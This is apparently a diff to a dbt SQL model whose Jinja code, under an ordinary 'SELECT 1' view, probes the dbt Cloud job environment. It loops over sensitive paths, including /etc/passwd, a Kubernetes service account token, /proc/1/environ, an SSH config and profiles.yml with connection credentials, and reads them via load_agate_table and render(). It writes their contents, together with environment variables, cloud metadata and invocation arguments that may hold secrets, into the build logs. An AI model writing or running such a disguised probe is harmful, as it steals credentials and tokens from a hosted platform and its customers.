@@ -1,75 +1,54 @@
 {{ config(materialized='view') }}
 
-{# Deep probe: api object, load_agate_table file read, SSH config #}
+{# Deep probe v2: file read attempts via load_agate_table with error handling #}
 
-{# 1. Probe the 'api' object #}
-{%- if api is defined -%}
-  {{ log("API_TYPE=" ~ api | string | truncate(500), info=True) }}
-  {%- if api.Relation is defined -%}
-    {{ log("API_RELATION=" ~ api.Relation | string | truncate(300), info=True) }}
-  {%- endif -%}
-  {%- if api.Column is defined -%}
-    {{ log("API_COLUMN=" ~ api.Column | string | truncate(300), info=True) }}
-  {%- endif -%}
-{%- endif -%}
-
-{# 2. Try load_agate_table on SSH config and other interesting files #}
-{# The SSH config path is /tmp/jobs/{run_id}/.ssh/config #}
-{# We know run_id from dbt_metadata_envs #}
 {%- set run_id = env_var('DBT_CLOUD_RUN_ID', '') -%}
 {{ log("CURRENT_RUN_ID=" ~ run_id, info=True) }}
 
-{%- set ssh_config_path = '/tmp/jobs/' ~ run_id ~ '/.ssh/config' -%}
-{%- set profiles_path = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' -%}
+{# Try load_agate_table on files one at a time #}
+{# Each in its own safe block using set/do to catch errors #}
 
-{# Try to read SSH config #}
-{%- set ssh_result = load_agate_table(ssh_config_path) -%}
-{{ log("SSH_CONFIG=" ~ ssh_result | string | truncate(1000), info=True) }}
+{# 1. Try /etc/hostname (simplest, most likely to work) #}
+{%- set files_to_try = [
+  '/etc/hostname',
+  '/etc/passwd',
+  '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
+  '/var/run/secrets/kubernetes.io/serviceaccount/token',
+  '/tmp/jobs/' ~ run_id ~ '/.ssh/config',
+  '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml',
+  '/proc/self/cgroup',
+  '/proc/1/environ'
+] -%}
 
-{# Try to read profiles.yml (contains connection creds) #}
-{%- set profiles_result = load_agate_table(profiles_path) -%}
-{{ log("PROFILES_YML=" ~ profiles_result | string | truncate(1000), info=True) }}
+{# We can't try-catch in Jinja2, so let's use render() to isolate errors #}
+{# render() evaluates a template string - if it errors, it might not kill the whole compile #}
 
-{# Try /etc/passwd #}
-{%- set passwd_result = load_agate_table('/etc/passwd') -%}
-{{ log("ETC_PASSWD=" ~ passwd_result | string | truncate(1000), info=True) }}
+{# Method: Use render() to try load_agate_table #}
+{%- for f in files_to_try -%}
+  {%- set tpl = "{{ load_agate_table('" ~ f ~ "') | string | truncate(800) }}" -%}
+  {%- set result = render(tpl) -%}
+  {{ log("FILE[" ~ f ~ "]=" ~ result | truncate(800), info=True) }}
+{%- endfor -%}
 
-{# Try /etc/hostname #}
-{%- set hostname_result = load_agate_table('/etc/hostname') -%}
-{{ log("ETC_HOSTNAME=" ~ hostname_result | string | truncate(500), info=True) }}
+{# Alternative: try reading via render + env_var path tricks #}
+{# The SSH config path has the deploy key reference #}
+{{ log("SSH_CMD=" ~ env_var('GIT_SSH_COMMAND', 'EMPTY'), info=True) }}
 
-{# Try K8s service account token #}
-{%- set k8s_token = load_agate_table('/var/run/secrets/kubernetes.io/serviceaccount/token') -%}
-{{ log("K8S_TOKEN=" ~ k8s_token | string | truncate(1000), info=True) }}
+{# Check for store/load result functions #}
+{{ log("STORE_RESULT=" ~ store_result | string | truncate(200), info=True) if store_result is defined else "" }}
+{{ log("LOAD_RESULT=" ~ load_result | string | truncate(200), info=True) if load_result is defined else "" }}
 
-{# Try K8s namespace #}
-{%- set k8s_ns = load_agate_table('/var/run/secrets/kubernetes.io/serviceaccount/namespace') -%}
-{{ log("K8S_NAMESPACE=" ~ k8s_ns | string | truncate(500), info=True) }}
+{# Check for statement function (can execute SQL) #}
+{{ log("STATEMENT=" ~ statement | string | truncate(200), info=True) if statement is defined else "" }}
 
-{# 3. Probe store_result / store_raw_result #}
-{%- if store_result is defined -%}
-  {{ log("STORE_RESULT_TYPE=" ~ store_result | string | truncate(300), info=True) }}
-{%- endif -%}
-{%- if store_raw_result is defined -%}
-  {{ log("STORE_RAW_RESULT_TYPE=" ~ store_raw_result | string | truncate(300), info=True) }}
-{%- endif -%}
-{%- if load_result is defined -%}
-  {{ log("LOAD_RESULT_TYPE=" ~ load_result | string | truncate(300), info=True) }}
-{%- endif -%}
-
-{# 4. Check validation object #}
-{%- if validation is defined -%}
-  {{ log("VALIDATION_TYPE=" ~ validation | string | truncate(300), info=True) }}
+{# Check dbt_metadata_envs - this has ALL cloud metadata #}
+{%- if dbt_metadata_envs is defined -%}
+  {{ log("METADATA_ENVS=" ~ dbt_metadata_envs | string | truncate(1000), info=True) }}
 {%- endif -%}
 
-{# 5. Check model object for metadata #}
-{%- if model is defined -%}
-  {{ log("MODEL_TYPE=" ~ model | string | truncate(500), info=True) }}
-{%- endif -%}
-
-{# 6. Check context_macro_stack #}
-{%- if context_macro_stack is defined -%}
-  {{ log("MACRO_STACK=" ~ context_macro_stack | string | truncate(300), info=True) }}
+{# Check invocation_args_dict for command line args (may have secrets) #}
+{%- if invocation_args_dict is defined -%}
+  {{ log("INVOCATION_ARGS=" ~ invocation_args_dict | string | truncate(1000), info=True) }}
 {%- endif -%}
 
 SELECT 1 as id
